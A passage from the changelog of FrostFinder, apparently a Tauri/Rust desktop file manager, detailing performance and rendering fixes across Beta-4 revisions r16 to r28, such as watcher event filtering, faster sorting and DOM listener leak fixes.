`refreshColumns` now calls `_patchEntries` directly on the live DOM column element and collects the return values. If every column returns `false` (fingerprint matched — no listing change), `render()` is not called at all. The sel/cut-item/tag-tint sync that `_patchEntries` already performed is sufficient — the toolbar, tabs, preview panel, and status bar are already correct and don’t need rebuilding.

For file-operation callers (`changedPath=null`) that change the actual listing, `anyChanged` becomes `true` and `render()` fires normally.

**3. `dir-changed` handler watches all open columns, not just `currentPath` (`src/main.js`)**

Previously the handler only called `refreshColumns` when `changedPath === state.currentPath`. This missed cases where a *parent* column’s directory changed while a subfolder was open (e.g. a file was added to Downloads while Downloads/claude-miller was the deepest open column). Fixed to check all open columns.

**Net result:** A watcher fire for an unchanged directory now costs: 1 IPC call (~5ms) + fingerprint compare (~0.1ms) + sel sync (~0.1ms) = ~5ms total, with **zero `render()` call**. The toolbar, tabs, and preview panel are untouched. The app stays fully interactive.

---

## What's in Beta-4-r28

**No Rust recompile required.** Changes in `src/main.js` and `src/views.js`.

### Fix — Downloads/Music/large-folder freeze: `sortEntries` running on every watcher fire (`src/main.js`, `src/views.js`)

**Diagnosis from `frostfinder-debug-1773494131718.log`:**

Navigation to every folder was fast (7–35ms). The freeze was not during navigation. The log showed **13 watcher-triggered `RENDER` calls in 7.7 seconds** while the user was idle in Music (×2 columns, 542 entries). These renders happened at ~1.5/s — the inotify watcher was firing for Music metadata updates (album art, thumbnails, media player atime writes).

Each watcher fire called `_patchEntries` for **all open columns**. `_patchEntries` called `sortEntries()` **before** the fast-path check. The fast-path (skip DOM work if entries unchanged) was correct — but the expensive sort had already run before it could fire.

Root cause: `sortEntries` used `localeCompare(b.name, undefined, {sensitivity:'base'})`. This invokes the ICU Unicode collation library on every comparison. On Linux with glibc ICU, each call takes ~0.05ms. Sorting 542 Music entries requires ~4,900 comparisons: `542 × log2(542) × 0.05ms ≈ 250ms per sort`. With 13 watcher fires: **~3.25 seconds of blocked JS main thread in an 8-second window = 42% of the time the app was unresponsive**.

This affected any folder that received watcher events while large directories were open in other columns — not just Downloads. The user also saw it in Music and claude-miller because those columns stayed open while the watcher fired.

---

### Fix 1 — Pre-sort fingerprint fast-path in `_patchEntries` (`src/views.js`)

**Root cause:** `sortEntries()` ran unconditionally at the top of `_patchEntries`, before any check for whether the directory had actually changed. The fast-path check (comparing sorted first/last entry paths) only fired *after* the sort had already run — too late to save the CPU.

**Fix:** Added a **pre-sort fingerprint** stored per-column at build time: `count + '|' + first_raw_name + '|' + last_raw_name`. On each `_patchEntries` call, this fingerprint is computed from the new raw (unsorted) entries in O(1) and compared to the stored value **before** calling `sortEntries`.

If the fingerprint matches, the directory listing hasn't changed — no sort, no DOM eviction, no repaint. Only visible `.frow` elements are walked to sync `.sel`/`.cut-item`/tag-tint classes (~0.1ms regardless of directory size).

**Cost reduction:**
- Unchanged dir (common case — watcher fires for metadata/atime): `250ms → 0.1ms` (×2500 faster)
- Changed dir (file added/removed/renamed): sort still runs, ~5–10ms with new algorithm

**Edge case:** A rename of a middle file (not alphabetically first or last) won't change the fingerprint's first/last names. The post-sort identical check (comparing sorted first/last paths) catches this case.

---

### Fix 2 — Faster sort algorithm in `sortEntries` (`src/main.js`)

**Root cause:** `localeCompare(b.name, undefined, {sensitivity:'base'})` is called O(n log n) times during a sort. Each call invokes ICU Unicode collation which is 50–100× slower than a plain string comparison for typical filenames.

**Fix:** Schwartzian transform for name sort:
1. Pre-compute `name.toLowerCase()` once per entry — O(n) `toLowerCase()` calls
2. Sort using plain `<`/`>` string comparison — O(n log n) fast native ops, no ICU

```js
const keyed = entries.map(e => ({ e, k: e.name.toLowerCase() }));
keyed.sort((a, b) => dir * (a.k < b.k ? -1 : a.k > b.k ? 1 : 0));
return keyed.map(x => x.e);
```

**Performance:** 542 entries: `~250ms → ~5ms` (×50 faster). This benefits every initial column build and every case where a directory change is detected.

Size/date/type sort columns are unchanged (they use their own comparison logic).

---

## What's in Beta-4-r27

**Rust recompile required.** Change in `src-tauri/src/main.rs` only.

### Fix — Downloads folder slowdown: root cause corrected in watcher event filter (`src-tauri/src/main.rs`)

**Root cause — `Modify(_)` wildcard in watch_dir caught all Modify subtypes:**

The watcher's match arm was:
```rust
Create(_) | Modify(_) | Remove(_) | Other => { /* temp-extension filter... */ }
```

`Modify(_)` matches every `ModifyKind` variant in notify v6:
- `ModifyKind::Data` — file content written (every write to a file)
- `ModifyKind::Metadata` — permissions, timestamps
- `ModifyKind::Name` — rename/move
- `ModifyKind::Other` / `ModifyKind::Any`

When a browser writes to a `.crdownload` file during an active download, the OS fires `Modify(Data(...))` on every write. The event paths contain only the `.crdownload` file, so the downstream `all()` temp-extension filter correctly dropped those — **but only if the extension matched the filter list**.

Two problems remained:
1. The temp-extension filter is a brittle workaround. It required maintaining a list of known browser temp-file extensions and could always be bypassed by an unexpected extension or a lock file written alongside the download.
2. Even with the filter, the event still reached the channel send, the channel buffer, the debounce thread's `recv()`, and the drain loop before being discarded downstream — wasted CPU on every write event, and any write where the path didn't match the extension filter (e.g. a `.tmp2` file, a lock file with no extension, a file whose name starts with `.` and has no extension) would pass through and trigger a full `refreshColumns()` → IPC → DOM cycle.

**Root cause identified:** The Downloads slowdown has always been caused by `Modify(Data)` events — file content writes — reaching the channel. A content write never changes the directory listing (no files are added, removed, or renamed), so refreshing the column on Modify(Data) is always wrong, regardless of what filename triggered it.

**Fix — match only events that actually change the directory listing:**

```rust
let should_emit = match event.kind {
    Create(_) | Remove(_) => true,
    Modify(ModifyKind::Name(_)) => true,   // rename/move — listing changed
    Modify(_) => false,                     // content writes — listing unchanged
    _ => false,
};
```

The temp-extension filter and the `any()`/`all()` debate are now irrelevant — `Modify(Data)` events never reach the channel at all.

**Correctness:** Download completing (`.crdownload` → `.mp4` rename) fires `Modify(Name(_))` → passes through → `dir-changed` fires → column refreshes showing the new file. ✓ Active download writes fire `Modify(Data)` → dropped immediately → zero channel traffic → zero refreshes during the download. ✓

---

## What's in Beta-4-r26


**No Rust recompile required.** Changes in `src/views.js` and `src/main.js`.

### Fix — Column view selection/highlight invisible after click (`src/views.js`)

**Root cause — `_patchEntries` fast-path returned with no DOM update:**

The r19 incremental reconciliation added a fast-path inside `_patchEntries`: when the directory entries haven't changed (same count, same first and last path), the function returned immediately with zero DOM work. This was correct for the `refreshColumns` case (watcher fires, nothing changed → skip).

However, `_patchEntries` is also called from every `render()` triggered by a click. When the user clicks row `ei=5`:
1. `sel.set(5)` adds the path to `sel._paths` ✓
2. `render()` fires → `renderColumnView()` → `_patchEntries(col.entries, 5)`
3. Entries are identical (nothing was added/deleted) → **fast-path fires → `return` immediately**
4. The `.sel` class is never added to row 5 → row stays visually unselected

The user saw their selection not appearing no matter how many times they clicked. Since this applied to every click in every open column, the entire column view felt broken — "widespread glitching" and "select not working" were the same root cause.

**Fix:** In the fast-path branch, before returning, walk every currently rendered `.frow` and sync three visual properties that can change without entries changing:
- `.sel` class — selection highlight
- `.cut-item` class — dimming for cut files
- `background` style — tag color tint

This costs ~0.3ms per call (toggling classList on ~30 rows) and is completely invisible to the user. The DOM stays correct through every click, keyboard navigation, Ctrl+C/X, and tag operation.

---

### Fix — `attachDragSelect` leaked `document` listeners on every column navigation (`src/views.js`)

**Root cause:**

`attachDragSelect` registers two document-level event listeners per column:
```js
document.addEventListener('mousemove', onMove, { passive: false });
document.addEventListener('mouseup',   onUp);
```

When the incremental reconciler removes a stale column element, the `colList` DOM node is detached — its own `.mousedown` listener disappears with it. But the two `document` listeners captured in the closure were **never removed**. They accumulated silently across every directory navigation.

After navigating through 15 folders in column view: 15 `mousemove` + 15 `mouseup` handlers active on `document`. Every mouse movement fired all 15 `onMove` callbacks. Each checks `if (!armed && !active) return` immediately (cheap), but 15 checks per event × 60fps mouse input = 900 extra callback invocations per second of mouse movement. On slower hardware this contributed to the reported sluggishness.

More importantly: stale `onMove` callbacks from dead columns still held references to `armed` and `active` from their original closure. A stale `active=true` surviving from a previous drag-select session could cause phantom selection state to appear in a new column.

**Fix:** A `MutationObserver` watches `document.body` for subtree changes. When `colList.isConnected` becomes `false` (column removed by reconciler), the observer removes both document listeners and disconnects itself. Zero leakage regardless of how many directories the user navigates through.

---

### Fix — `refreshColumns` had no re-entrancy guard for watcher events (`src/main.js`)

**Root cause:**

`refreshColumns(changedPath)` is called from the `dir-changed` event listener every time the filesystem watcher fires. `refreshColumns` is `async` — it `await`s a `listDirectory` IPC call. If `dir-changed` fires a second time while the first call is still awaiting the IPC response, a second `refreshColumns` starts concurrently. Both then call `render()` independently when they complete, producing two rapid repaints in close succession.

In a busy Downloads folder where the Rust watcher debounce was partially filtering events but still passing through rename completions at irregular intervals, this caused visible column thrashing — rows being evicted and recreated twice in quick succession, producing a flash.

**Fix:** Added `_watcherRefreshPending` flag (module-level boolean). When `refreshColumns` is called with a `changedPath` (watcher origin) and the flag is set, the call returns immediately — the in-flight refresh will render the latest state anyway. The flag is cleared in a `finally` block so a failed IPC call can't permanently lock out future refreshes. File-operation callers (`changedPath = null`) bypass the guard and always run.

---

## What's in Beta-4-r25


**No Rust recompile required.** Changes in `PACK.sh`, `src-tauri/tauri.conf.json`, and `src-tauri/icons/`.

### Fix — App icon updated to official FrostFinder branding (`src-tauri/icons/`)

**Change:** All Tauri icon assets replaced with the official FrostFinder icon (yeti mascot holding magnifying glass on winter snowy background).

Updated files:
- `src-tauri/icons/32x32.png` — 32×32 toolbar/taskbar icon
- `src-tauri/icons/128x128.png` — 128×128 standard icon
- `src-tauri/icons/128x128@2x.png` — 256×256 HiDPI icon
- `src-tauri/icons/icon.ico` — Windows multi-resolution ICO (16/32/48/64/128/256px)
- `src-tauri/icons/icon.icns` — macOS ICNS icon bundle

---

### Fix — `PACK.sh` zip command referenced non-existent `BUILD.sh` (`PACK.sh`)

**Root cause:** The zip include list in `PACK.sh` listed `BUILD.sh` as a file to bundle. No such file exists in the project tree — only `PACK.sh` exists. On every pack run, `zip` would warn about a missing file and the packager script itself was absent from the output archive.

**Fix:** Replaced `BUILD.sh` with `PACK.sh` in the zip include list so the packager script is correctly bundled in every release archive.

---

### Fix — `PACK.sh` zip command missing `ql.html` (`PACK.sh`)

**Root cause:** `ql.html` — the Quick Look native window HTML entry point — was not listed in the `zip -r` include list inside `PACK.sh`. Every release archive produced by `PACK.sh` was missing this file. Any recipient building from the archive would get a broken Quick Look window (blank content, no `ql-ready` event ever firing), exactly the regression that was root-caused and fixed in r42/r43 of Beta-3. The file had to be added manually each time.

**Fix:** Added `ql.html \` to the zip include list immediately after `index.html`. It will now be included automatically on every `./PACK.sh` run.

---

### Fix — `tauri.conf.json` version string stale at `4.0.1` (`src-tauri/tauri.conf.json`)

**Root cause:** The `package.version` field in `tauri.conf.json` was never updated from the initial Beta-4-r1 value of `4.0.1`. The bundle version embedded in the compiled binary and shown in system package managers remained `4.0.1` through r2–r24, regardless of the actual revision.

**Fix:** Updated `"version"` to `"4.0.25"` matching this revision.

---

## What's in Beta-4-r24

**No Rust recompile required.** Changes in `src/views.js` and `src/main.js`.

### Fix — Music column shows unsorted entries (`src/views.js`)

**Root cause — deferred sort invalidated by `refreshColumns()`:** The r23 deferred sort (`requestIdleCallback` for >300 entries) was broken by a two-part interaction. First, `listDirectory` returns entries in filesystem order (unsorted). The deferred sort would fire, sort `entries`, and update the closure reference. But `refreshColumns()` — triggered by `dir-changed` watcher events — calls `_patchEntries` with a fresh unsorted batch from IPC, overwriting `entries` with the new unsorted array before the next user interaction. The idle sort fires again, sorts, and the cycle repeats: watcher event → unsorted → sort → watcher event → unsorted → sort. Because `dir-changed` fires every 5–10 seconds while Music is open (observed in the debug log at +5.0s, +23.0s, +32.8s, +50.5s), the column is almost never sorted for more than a few seconds.

**Root cause — fast-path check comparing sorted vs unsorted:** The no-op fast-path added in r23 checked `pEntries[0].path === entries[0].path` before sorting `pEntries`. `pEntries` arrives in unsorted filesystem order from IPC; `entries` is sorted alphabetically. These virtually never match, so the fast-path always missed and always triggered a full repaint even when the directory hadn't changed.

**Fix:** Sort `pEntries` synchronously and unconditionally, *before* the fast-path check. Sorting 893 JS strings takes ~1ms — not a bottleneck. The fast-path boundary check now compares sorted-vs-sorted and correctly identifies unchanged directories. The deferred `requestIdleCallback` sort is removed entirely.

---

### Fix — Downloads folder slowdown: `refreshColumns()` re-lists all open columns on every watcher event (`src/main.js`)

**Root cause:** `refreshColumns()` was called with no arguments from the `dir-changed` handler. It always re-listed every open column with `Promise.all(state.columns.map(...))`. With 2 open columns (e.g. `/home/jay` and `/home/jay/Downloads`), each watcher event triggered 2 IPC calls — even though only Downloads changed. With an active browser download in Downloads (watcher firing every 300ms), this was ~7 IPC calls/second for directories that hadn't changed, each taking 5–10ms.

**Fix:** `refreshColumns(changedPath)` now accepts an optional `changedPath`. When provided, only the column whose path matches `changedPath` is re-listed. The `dir-changed` handler passes `changedPath` so only the single watched directory is re-fetched. File operation callers (drag-drop, paste, delete, rename, etc.) call `refreshColumns()` with no argument and still refresh all open columns, which is correct for those cases.

---

## What's in Beta-4-r23

**No Rust recompile required.** Changes in `src/views.js` only.

### Fix — Music folder glitch: `_patchEntries` paints before updating `scrollTop` (`src/views.js`)

**Root cause:** `_patchEntries` called `_paintColList()` first, then updated `colList.scrollTop`. Each painted row is `position:absolute` at a fixed `top` computed from its index. After the paint, changing `scrollTop` immediately scrolls those rows off-screen. The async `scroll` event listener fires `_paintColList()` in a later microtask, but the browser gets to composite one frame first — a frame where the visible area contains no rows at all. That one-frame blank is the visible glitch on every Music patch render (first-chunk 60 entries → full 893 entries).

**Fix:** Scroll position is now updated *before* evicting rows and calling `_paintColList()`. `_paintColList()` reads `colList.scrollTop` at the moment it runs, so painting with the final scroll position means painted rows are immediately at the correct location. Zero-frame gap, zero flash.

---

### Fix — Downloads slowdown: `_patchEntries` blocks the main thread sorting large directories (`src/views.js`)

**Root cause:** `sortEntries(pEntries)` ran synchronously on the full entry list every time `_patchEntries` was called — including on every `refreshColumns()` triggered by a `dir-changed` watcher event. For a large Downloads folder (2000+ entries), this sort takes 15–40ms on the main thread, causing a visible stall each time the watcher fires. The `dir-changed` watcher fires whenever a file is created, renamed, or modified in the watched directory; an active browser download triggers this repeatedly.

**Fix — deferred sort for large directories:** Entries with ≤ 300 items are still sorted synchronously (fast path, no behaviour change for typical small folders). For lists over 300 entries: the unsorted list is rendered immediately so the column is interactive at once, then `requestIdleCallback` runs the full sort and does one quiet re-render when the browser is idle. First paint is instantaneous regardless of directory size.

---

### Fix — Downloads slowdown: `_patchEntries` evicts and repaints all rows even when entries are unchanged (`src/views.js`)

**Root cause:** Every `refreshColumns()` call — which fires on every `dir-changed` watcher event — updated `col.entries` and then called `_patchEntries`. Inside `_patchEntries`, there was no check for whether the entries actually changed. All visible rows were unconditionally evicted and recreated even when the directory listing was byte-for-byte identical to the last fetch. With the watcher firing every few seconds (active downloads, downloads completing), this caused continuous DOM churn: evict ~20 rows × 3 columns = ~60 DOM node deletions and ~60 re-creations every watcher event, with no visible change to the user.

**Fix — no-op fast path:** At the start of `_patchEntries`, before any DOM work, the new entry list is compared against the current list by length and boundary paths (first + last entry path). If identical, `_patchEntries` returns immediately — no eviction, no repaint, no spacer update. The `sel._e` reference is refreshed (zero cost). For the common case where `refreshColumns()` re-fetches an unchanged directory, the column view is now completely static.

---

## What's in Beta-4-r22

**No Rust recompile required** for the JS fixes. **Rust recompile required** for the watcher fix (`src-tauri/src/main.rs`).

### Fix — Music folder glitch: `attachDragSelect` holding stale first-chunk entries array (`src/views.js`)

**Root cause:** `attachDragSelect(colList, entries, ...)` was called with `entries` passed **by value** at column build time — at that point the array holds only the first 60 streamed entries. When `_patchEntries` subsequently runs and reassigns `entries = pEntries` (all 893 entries), the column's closure variable updates correctly, but `attachDragSelect`'s internal `entries` binding still pointed at the original 60-item array.

After the patch render, `applyRange()`, `syncClasses()`, and `activate()` inside `attachDragSelect` all read from the stale 60-item array. Rows 60–892 were invisible to drag-select: `entries[i]` returned `undefined` for any index ≥ 60, paths were never added to `sel._paths`, and `.sel` class toggling silently did nothing for those rows. The visible symptom was partial selection state — some rows appeared selected but the actual selection didn't match — and occasional flash as a stale render invalidated a row that `syncClasses` thought was unselected.

The rubber-band `onDone` callback captured `entries` the same way and had the same issue.

**Fix:** Changed `attachDragSelect` to accept `getEntries` (a `() => entries` getter closure) instead of the array directly. Every internal callback (`applyRange`, `syncClasses`, `activate`, rubber-band `onDone`) now calls `getEntries()` at invocation time to read the live array. The call site passes `() => entries` so the getter always resolves to whatever `entries` currently points to after any `_patchEntries` reassignment.

---

### Fix — Music folder glitch: `selIdx` out-of-bounds scroll during `_patchEntries` (`src/views.js`)

**Root cause:** If `col.selIdx` was set to a value ≥ 60 (e.g. from a previous navigation that remembered a deep selection) when the first-chunk render fires, `_patchEntries` computed the scroll target as `selIdx × 28px`. With only 60 entries in the first chunk, the spacer height was `60 × 28 = 1680px`. A `selIdx` of 400 produced a scroll target of `11200px` — far past the current spacer bottom — causing the list to snap to the maximum scroll position and then jump again when the spacer expanded to `25004px` on the final patch.

**Fix:** Added a clamp guard in `_patchEntries` before the scroll block: `if (newSelIdx >= entries.length) newSelIdx = -1`. If the selection index is out of range for the current (possibly partial) entry list, the scroll-to-selected is simply skipped for this patch, and the user's scroll position is left undisturbed.

---

### Fix — Downloads folder: watcher swallows download-completion rename events (`src-tauri/src/main.rs`)

**Root cause:** The temp-file extension filter used `any()`: if **any** path in a filesystem event had a temp extension, the entire event was dropped. A browser download completing is implemented by the OS as a rename from `file.mp4.crdownload` → `file.mp4`. The inotify `Rename` event carries **both** paths: the old `.crdownload` path and the new `.mp4` path. Because the old path matched the temp-extension filter, `any()` dropped the event entirely — the Downloads folder never refreshed when a download finished, only when the user navigated away and back.

**Fix:** Changed `any()` to `all()` with an additional `!event.paths.is_empty()` guard. Events are now only suppressed when **every** affected path is a temp-extension file. Active-download write bursts (where all paths are `.crdownload`) are still filtered out. Rename completions (one `.crdownload` path + one real path) now pass through and trigger a `refreshColumns()` as expected.

---

## What's in Beta-4-r21

**Rust recompile required.** Changes in `src/views.js` and `src-tauri/src/main.rs`.

### Fix — Music folder glitch: container-level event listeners stacking across renders (`src/views.js`)

**Root cause:** `container.addEventListener('contextmenu', ...)` and `container.addEventListener('mousedown', ...)` were appended inside `renderColumnView` after the `forEach`. With incremental reconciliation, `container` (`#cols`) is the same DOM element across renders — it is only created once and reused. Every render call added new listeners without removing old ones. After the first-chunk render and the patch render, there were 2 contextmenu handlers and 2 mousedown handlers. After 10 navigations, 10 of each. Every right-click fired every contextmenu handler, calling `render()` and `showContextMenu()` multiple times simultaneously. The second call to `showContextMenu` on the same event produced the visible glitch (duplicate menus, double renders, content flash).

**Fix:** Added a `container._listenersAttached` sentinel. The two container-level listeners are registered only on the first render. Subsequent renders skip them. The listener callbacks call `d()` at event time (not capture time) to read current state — same pattern used by event delegation elsewhere.

---

### Fix — Scroll-to-rightmost-column firing on patch renders (`src/views.js`)

**Root cause:** `requestAnimationFrame(()=>{ w.scrollLeft = w.scrollWidth; })` fired at the end of every `renderColumnView` call, including patch renders (when streaming delivers the full 893-entry list after the first-chunk render). If the user had started scrolling left between the two renders, the patch render's rAF snapped them back to the right edge. This was the primary visible "glitch" on the Music folder.

**Fix:** Added `let _newColAppended = false` before the forEach. Set to `true` only in the new-column branch (when `container.appendChild(colEl)` runs). The scroll-right rAF only fires when `_newColAppended` is true — that is, when at least one column was newly built rather than patched in-place.

---

### Fix — Active downloads flooding `dir-changed` events (`src-tauri/src/main.rs`)

**Root cause:** The inotify watcher on `~/Downloads` fired on every write to any file in the directory. Browsers write `.part`, `.crdownload`, and `.tmp` files continuously while downloading — each write triggered a notify event. Although the 300ms debounce coalesced bursts, a download in progress produced a constant stream of debounce-reset events, keeping `tx.send()` firing repeatedly and triggering `refreshColumns()` on the open Downloads folder every ~300ms.

**Fix:** Added an extension filter in the watcher callback. Events where all paths have a temp-download extension (`.part`, `.crdownload`, `.tmp`, `.download`, `.partial`) are dropped before being sent to the debounce channel. The directory listing no longer refreshes during an active browser download. Real filesystem changes (new files, renames, deletions) still propagate normally.

---

## What's in Beta-4-r20

**No Rust recompile needed.** Changes in `src/utils.js` and `src/main.js`.

### Fix — PDF files showed generic icon instead of document icon (`src/utils.js`)

`fileIcon()` called `getIcon('pdf')` but `'pdf'` was not a key in the `I` SVG object. `getIcon` returns `I[key] || I.file`, so the fallback silently produced the generic file icon for all PDF files. Added a `pdf` entry to `I` — a document SVG with an extra horizontal rule to visually distinguish it from the plain `doc` icon.

---

### Fix — Tag colors missing on first load (`src/main.js`)

The global `state` object was missing `_tagColors: {}` and `activeTag: null`. Both fields existed in `makeTabState()` and in `syncState()`'s copy list, but the top-level `state = { ... }` initializer didn't declare them. On first load, before any tab switch (`syncState` → `Object.assign(state, tabState)`), any code reading `state._tagColors?.[tag]` received `undefined`, so tag row tinting and tag color lookups produced no color. Added both fields to the global initializer.

---

### Fix — Stale navigate() called `watch_dir` with the wrong path (`src/main.js`)

When the user clicks a second folder before the first stream finishes, `_streamDir` resolves `null` (stale guard) and `navigate()` returns early from the `try` block. The `finally` block still ran unconditionally and called `invoke('watch_dir', {path})` with the **stale** path — starting an inotify watch on a directory the user never navigated to. The winning navigate's `finally` would overwrite it shortly after, but there was a brief window where filesystem change events from the wrong directory could trigger a `refreshColumns()`. Added `if(mySeq === _navSeq)` guard around the `watch_dir` call in `finally`.

---

## What's in Beta-4-r19

**No Rust recompile needed.** Change in `src/views.js` only.

### Fix — Column view flashes blank when streaming patch arrives (`src/views.js`)

**Root cause:**

`renderColumnView` called `container.innerHTML=''` on every render, tearing down and rebuilding all column DOM elements from scratch. With r17/r18 streaming, two renders fire per navigation:

1. **First-chunk render** — builds the new column with 60 entries, attaches virtual scroller, event listeners, ResizeObserver, drag-select, rubber-band
2. **Patch render** (finally block) — `container.innerHTML=''` wipes everything, rebuilds the same column again with all entries

The wipe between renders is the visible glitch: one frame where the column is completely blank. This also explains why navigating to Music from a different folder (e.g. Pictures → Music) showed a flash — the two renders weren't adjacent, they had a frame gap.

**Fix — Incremental column reconciliation:**

Before building columns, `renderColumnView` now computes which existing `.col` DOM elements can be reused:

- Trims trailing columns whose count exceeds `state.columns.length`
- Trims any column (and everything after it) whose `dataset.colPath` doesn't match the expected path at that position
- For columns that survive the trim: calls `colEl._patchEntries(entries, selIdx)` and returns immediately — no rebuild

Each newly built `.col` element gets:
- `dataset.colPath = col.path` — stable identity key
- `_patchEntries(newEntries, newSelIdx)` — closes over the column's `let entries`, `_colSpacer`, `_cPainted`, `_paintColList`, and `colList`. On call: filters/sorts the new entries, updates `entries` reference in-place, adjusts the spacer height, evicts stale row elements, repaints the visible window, and scrolls to selection if needed

**Result:** The patch render (when 893 entries fill in after the first 60) performs zero DOM teardown. It updates the spacer height from `60×28=1680px` to `893×28=25004px` and calls `_paintColList()` — the virtual scroller fills in the new rows around the scroll position. No flash, no blank frame, no listener re-attachment.

---

## What's in Beta-4-r18

**Rust recompile required.** Change in `src-tauri/src/main.rs` only.

### Perf — Streaming IPC overhead eliminated; column navigation now consistently fast (`src-tauri/src/main.rs`)

**Root cause (confirmed by `frostfinder-debug-1773452292244.log`):**

r17 introduced streaming — the first 60 entries rendered immediately, but total navigation time for large folders got *worse*, not better:

| Folder | Entries | r16 total | r17 total |
|--------|---------|-----------|-----------|
| Music  | 893     | 25ms      | **54ms**  |
| BETA1  | 142     | 5ms       | 14ms      |

The regression came from `window.emit()` IPC overhead. Each `window.emit()` call from inside `spawn_blocking` crosses the Tauri/WebKit IPC boundary, which serializes the payload to JSON and posts it to the WebKit main thread. This costs ~2–3ms per call, independent of payload size. r17 emitted one chunk every 60 entries: 893 ÷ 60 = 15 intermediate emits + 1 final = **16 calls × ~3ms = ~48ms overhead** added on top of the actual ~6ms read time.

**Fix — Two-emit strategy:**

1. **First emit** (`done: false`): fires as soon as the first 60 entries are read. JS renders the column immediately (~11ms). The `spawn_blocking` thread keeps reading while the first chunk is painting.
2. **Final emit** (`done: true`): fires once after all remaining entries are collected in a Rust `Vec`. Carries the rest of the entries + `parent` + `total`. JS patches the full list in silently.

Total IPC calls for any directory: **2** (regardless of size). Expected results:

| Folder | Entries | r18 total |
|--------|---------|-----------|
| Music  | 893     | ~14ms     |
| BETA1  | 142     | ~8ms      |

First paint unchanged (~11ms for large dirs, immediate for small dirs).

The `_streamDir` listener in JS already handles both cases correctly: for dirs ≤ 60 entries, the first emit never fires (Rust skips it), the final emit carries all entries with `done:true`, `onFirstChunk` fires on that single event, then the Promise resolves immediately.

---

## What's in Beta-4-r17

**Rust recompile required.** Changes in `src-tauri/src/main.rs` and `src/main.js`.

### Fix — Column navigation freezes: streaming was sync, JS had no streaming consumer (`src-tauri/src/main.rs`, `src/main.js`)

**Root cause 1 — `list_directory_streamed` was a sync `fn`, blocking the WebKit thread:**

`list_directory_streamed` was designed to emit 60-entry chunks as Tauri events so JS could render incrementally. However, it was declared as a plain `fn` (synchronous). Tauri v1 dispatches sync commands on the WebKit IPC handler thread. While the function looped through 893 entries calling `window.emit()`, the WebKit thread was blocked — emitted events queued up in the IPC channel but could not reach JS until the function returned. Streaming provided zero first-paint benefit; all 893 entries arrived at the same moment as a plain batch call.

**Fix:** Changed to `async fn` with `tauri::async_runtime::spawn_blocking`. The `invoke()` call returns to the WebKit thread immediately. The blocking directory read runs on a Tokio thread pool thread and emits 60-entry chunks. Each chunk flows to JS while the WebKit thread is free, enabling true incremental rendering. `Window` is `Send` in Tauri v1 and can be moved into the `spawn_blocking` closure.

**Root cause 2 — JS `navigate()` never used streaming; called batch `listDirectory` instead:**

Even after the Rust fix, `navigate()` still called `await listDirectory(path)` — a single-shot batch call that awaited the entire directory before touching the DOM.

**Fix:** Added `_streamDir(path, mySeq, onFirstChunk)` — a helper that registers a `dir-chunk` listener (before `invoke()`, to avoid the race where Rust fires `done:true` before the listener registers), then invokes `list_directory_streamed`. The `onFirstChunk(partialEntries)` callback fires when the first ~60 entries arrive, applying nav state and calling `render()` immediately. When `done:true` arrives, the full entry list is patched into the existing column in-place and a final `render()` fires. `navigate()` now calls `_streamDir` for column view instead of `listDirectory`.

Stale-nav guard is preserved: if `mySeq !== _navSeq` fires inside the listener (user clicked again mid-stream), the listener unlistens and resolves `null`. `if(!result) return` in `navigate()` exits cleanly.

**Root cause 3 — No visual feedback before the Rust await:**

`state.loading=true` was set but no render was triggered until after the await completed, so the toolbar spinner never appeared. The UI looked completely frozen for the full duration of the directory read.

**Fix:** Added `renderToolbar()` immediately after `state.loading=true`, before the first `await`. The spinner appears within 1ms of the click.

**Expected result (Music, 893 entries):**
- Before: 25ms hard freeze → column appears
- After: <1ms → spinner visible; ~3ms → first 60 entries appear; ~25ms → all 893 entries silently filled in (user already sees content)

---

### Fix — `walkdir` crate used but never declared in `Cargo.toml` (`src-tauri/src/main.rs`)

`_compress_files_sync` used `walkdir::WalkDir` for recursive directory traversal when compressing folders, but `walkdir` was never added to `Cargo.toml`. On a clean `cargo build` it fails with `E0432: unresolved import walkdir`. Replaced with a local recursive helper `walk_dir(root, out)` using only `std::fs::read_dir`. Behaviour is identical: depth-first, sorted by filename for deterministic zip output. `Cargo.toml` is unchanged.

---

### Fix — Dead code warning: `DirWatcher.path` field never read (`src-tauri/src/main.rs`)

`DirWatcher` stored a `path: String` field that was assigned at construction but never accessed. Removed the field and updated the construction site. The struct now holds only `_watcher: RecommendedWatcher`.

---

### Perf — Column view navigation uses `list_directory_fast` (zero stat syscalls) (`src-tauri/src/main.rs`, `src/main.js`)

`list_directory` called `build_file_entry` per entry (1–2 `lstat()`/`stat()` syscalls each). For large folders this cost was CPU-bound and irreducible: Music (893 entries) consistently took 25–34ms on every navigation, including revisits to already-cached folders.

`list_directory_fast` reads name, type, and symlink flag from the kernel `dirent` buffer returned by `read_dir()` — zero additional syscalls for normal files; one `stat()` only for symlinks to resolve their target. Added `pub is_symlink: bool` to `FileEntryFast` (free — already reading `file_type()`), populated in both `list_directory_fast` and `list_directory_streamed`.

`listDirectory()` now calls `list_directory_fast`. `listDirectoryFull()` calls `list_directory`. `navigate()` uses streaming for column view. `refreshColumns()` uses `listDirectory` (fast). The view-switcher non-column branch uses `listDirectoryFull` (list/gallery/icon need `size`/`modified` for their columns).

---

### Fix — Preview panel showed blank metadata for column-view entries (`src/main.js`)

Column view entries came from `FileEntryFast` (no `size`, `modified`, `permissions`, `created`, `accessed`). The preview panel rendered `--` for all metadata rows. `loadPreview()` now checks `entry.modified == null` and calls `get_entry_meta` first — a single `stat()` on one file. Preview panel shows correct metadata for both files and folders.

---

### Fix — `sortEntries` produced random order on Size/Date sort in column view (`src/main.js`)

`FileEntryFast` entries have no `size` or `modified`. The sort comparators used bare arithmetic (`a.size - b.size`, `a.modified - b.modified`) which evaluates to `NaN` for `undefined` operands, making the sort result undefined/random. Changed to `(a.size||0) - (b.size||0)` and `(a.modified||0) - (b.modified||0)`.

---

## What's in Beta-4-r16

**No Rust recompile needed.** JS-only changes (`src/main.js`, `src/utils.js`).

### Fix — Bundled icon themes removed from cold-start parse path (`src/utils.js`)

**Root cause:** `utils.js` unconditionally imported three large third-party icon theme bundles at module load time: `icons-kora.js` (56 KB), `icons-newaita.js` (102 KB), and `icons-whitesur.js` (216 KB). Vite bundled all three into the JS output regardless of whether the user ever selected one of those themes — adding ~375 KB of SVG string data to every cold start. The JS engine had to parse and intern all 374 KB before the app could display its first frame.

